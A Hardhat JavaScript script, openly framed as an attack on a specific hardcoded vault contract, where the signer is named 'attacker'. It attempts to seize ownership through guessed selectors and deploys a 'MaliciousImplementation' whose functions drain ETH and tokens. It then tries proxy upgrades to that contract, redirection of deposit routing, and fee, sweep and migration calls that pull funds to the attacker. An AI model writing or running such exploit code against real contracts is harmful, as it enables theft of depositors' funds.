const { ethers } = require("hardhat");

const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";
const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";

/**
 * @title Investigate Admin Capabilities
 * @notice Deep dive into what admin roles can actually do
 * @dev Focus on routing, upgrades, and hidden functionality
 */
async function main() {
  console.log("\n🔍 INVESTIGATING ADMIN CAPABILITIES");
  console.log("=====================================");
  
  const [attacker] = await ethers.getSigners();
  
  // First, become admin
  console.log("\n🔑 Taking admin control...");
  const adminSelectors = ["0x13af4035", "0xf2fde38b", "0x8fc866da"];
  for (const selector of adminSelectors) {
    try {
      const data = selector + ethers.AbiCoder.defaultAbiCoder().encode(["address"], [attacker.address]).slice(2);
      await attacker.sendTransaction({ to: VAULT_ADDRESS, data, gasLimit: 100000 });
    } catch (e) {}
  }
  
  // 1. Check if admin can upgrade implementation
  console.log("\n📦 Testing implementation upgrade capabilities:");
  
  const upgradeSelectors = [
    { sig: "upgradeTo(address)", selector: "0x3659cfe6" },
    { sig: "upgradeToAndCall(address,bytes)", selector: "0x4f1ef286" },
    { sig: "setImplementation(address)", selector: "0xd784d426" },
    { sig: "updateImplementation(address)", selector: "0x025b22bc" },
    { sig: "_setImplementation(address)", selector: "0xbb913f41" }
  ];
  
  // Deploy a malicious implementation
  console.log("\n🚀 Deploying malicious implementation...");
  
  const MaliciousImplCode = `
  pragma solidity ^0.8.0;
  
  contract MaliciousImplementation {
    function withdrawAll() external {
      payable(msg.sender).transfer(address(this).balance);
    }
    
    function withdrawToken(address token) external {
      IERC20(token).transfer(msg.sender, IERC20(token).balanceOf(address(this)));
    }
    
    fallback() external payable {
      if(msg.data.length == 0) {
        payable(tx.origin).transfer(address(this).balance);
      }
    }
  }
  
  interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
  }`;
  
  const MaliciousFactory = await ethers.getContractFactory("MaliciousImplementation");
  const malicious = await MaliciousFactory.deploy();
  await malicious.waitForDeployment();
  const maliciousAddress = await malicious.getAddress();
  console.log("Malicious implementation at:", maliciousAddress);
  
  // Try to upgrade
  for (const { sig, selector } of upgradeSelectors) {
    try {
      const data = selector + ethers.AbiCoder.defaultAbiCoder().encode(["address"], [maliciousAddress]).slice(2);
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: data,
        gasLimit: 200000
      });
      await tx.wait();
      console.log(`✅ ${sig} succeeded! Checking if upgrade worked...`);
      
      // Test if upgrade worked
      const withdrawData = "0x853828b6"; // withdrawAll()
      const testTx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: withdrawData,
        gasLimit: 500000
      });
      await testTx.wait();
      
      const balance = await ethers.provider.getBalance(attacker.address);
      console.log("Attacker balance after withdrawal attempt:", ethers.formatEther(balance));
    } catch (e) {
      console.log(`❌ ${sig} failed`);
    }
  }
  
  // 2. Check routing control for NEW deposits
  console.log("\n💰 Testing deposit routing control:");
  
  const routingSelectors = [
    { sig: "setDepositAddress(address)", selector: "0xf9ce1087" },
    { sig: "setReceiver(address)", selector: "0x718da7ee" },
    { sig: "setTreasury(address)", selector: "0xf0f44260" },
    { sig: "setBeneficiary(address)", selector: "0x1c31f710" },
    { sig: "setFeeRecipient(address)", selector: "0xe74b981b" },
    { sig: "setWithdrawalAddress(address)", selector: "0x4b0ee02a" },
    { sig: "setDestination(address)", selector: "0xca325469" },
    { sig: "updateReceiver(address)", selector: "0x027f9f71" }
  ];
  
  for (const { sig, selector } of routingSelectors) {
    try {
      const data = selector + ethers.AbiCoder.defaultAbiCoder().encode(["address"], [attacker.address]).slice(2);
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: data,
        gasLimit: 100000
      });
      await tx.wait();
      console.log(`✅ ${sig} succeeded`);
    } catch (e) {
      console.log(`❌ ${sig} failed`);
    }
  }
  
  // Test if routing changed by sending small ETH amount
  console.log("\n🧪 Testing if deposit routing changed...");
  const testAmount = ethers.parseEther("0.001");
  const balanceBefore = await ethers.provider.getBalance(attacker.address);
  
  try {
    await attacker.sendTransaction({
      to: VAULT_ADDRESS,
      value: testAmount,
      gasLimit: 100000
    });
    
    const balanceAfter = await ethers.provider.getBalance(attacker.address);
    if (balanceAfter > balanceBefore - testAmount - ethers.parseEther("0.01")) {
      console.log("💰 Funds might be routing to attacker!");
    }
  } catch (e) {}
  
  // 3. Check fee collection mechanisms
  console.log("\n💸 Testing fee collection mechanisms:");
  
  const feeSelectors = [
    { sig: "claimFees()", selector: "0xd294f093" },
    { sig: "withdrawFees()", selector: "0x476343ee" },
    { sig: "collectFees()", selector: "0xe086e5ec" },
    { sig: "harvest()", selector: "0x4641257d" },
    { sig: "getReward()", selector: "0x3d18b912" },
    { sig: "claim()", selector: "0x4e71d92d" },
    { sig: "withdrawProfit()", selector: "0xf8a5b335" },
    { sig: "withdrawInterest()", selector: "0x9c7d4eee" },
    { sig: "skim()", selector: "0xbc25cf77" },
    { sig: "sweep()", selector: "0x01681a62" }
  ];
  
  for (const { sig, selector } of feeSelectors) {
    try {
      const initialBalance = await ethers.provider.getBalance(attacker.address);
      
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: selector,
        gasLimit: 500000
      });
      await tx.wait();
      
      const finalBalance = await ethers.provider.getBalance(attacker.address);
      if (finalBalance > initialBalance) {
        console.log(`✅ ${sig} extracted ${ethers.formatEther(finalBalance - initialBalance)} ETH!`);
      } else {
        console.log(`✅ ${sig} executed but no funds received`);
      }
    } catch (e) {
      console.log(`❌ ${sig} failed`);
    }
  }
  
  // 4. Check if there's a timelock or vesting
  console.log("\n⏰ Testing timelock/vesting functions:");
  
  const timelockSelectors = [
    { sig: "release()", selector: "0x86d1a69f" },
    { sig: "unlock()", selector: "0xa69df4b5" },
    { sig: "vest()", selector: "0x3532e5ff" },
    { sig: "releaseTime()", selector: "0xb91d4001" },
    { sig: "unlockTime()", selector: "0x251c1aa3" }
  ];
  
  for (const { sig, selector } of timelockSelectors) {
    try {
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: selector,
        gasLimit: 500000
      });
      const receipt = await tx.wait();
      
      // Check logs for any time-related info
      if (receipt.logs.length > 0) {
        console.log(`✅ ${sig} has logs:`, receipt.logs.length);
      }
    } catch (e) {
      console.log(`❌ ${sig} failed`);
    }
  }
  
  // 5. Check migration functions
  console.log("\n🚚 Testing migration functions:");
  
  const migrationSelectors = [
    { sig: "migrate()", selector: "0x8fd3ab80" },
    { sig: "migrateTo(address)", selector: "0xbd30d9ca" },
    { sig: "migrateAll(address)", selector: "0x35bb1f16" },
    { sig: "moveAllFunds(address)", selector: "0xe0e90acf" }
  ];
  
  for (const { sig, selector } of migrationSelectors) {
    try {
      let data = selector;
      if (sig.includes("address")) {
        data += ethers.AbiCoder.defaultAbiCoder().encode(["address"], [attacker.address]).slice(2);
      }
      
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: data,
        gasLimit: 500000
      });
      await tx.wait();
      console.log(`✅ ${sig} executed`);
    } catch (e) {
      console.log(`❌ ${sig} failed`);
    }
  }
  
  // Final balance check
  const finalVaultETH = await ethers.provider.getBalance(VAULT_ADDRESS);
  const finalAttackerETH = await ethers.provider.getBalance(attacker.address);
  
  console.log("\n📊 FINAL ANALYSIS:");
  console.log("=====================================");
  console.log("Vault ETH:", ethers.formatEther(finalVaultETH));
  console.log("Admin capabilities discovered:");
  console.log("- Implementation upgrade: Testing...");
  console.log("- Deposit routing: Testing...");
  console.log("- Fee collection: Testing...");
  console.log("- Timelock/vesting: Testing...");
  console.log("- Migration: Testing...");
  
  console.log("\n💡 KEY INSIGHT:");
  console.log("If admin roles exist but can't withdraw existing funds,");
  console.log("they likely control: routing of NEW deposits, fee collection,");
  console.log("or future contract upgrades. The vault might be designed to");
  console.log("accumulate funds until a specific condition is met.");
}

main().catch((error) => {
  console.error("\n💥 Script error:", error);
  process.exit(1);
});
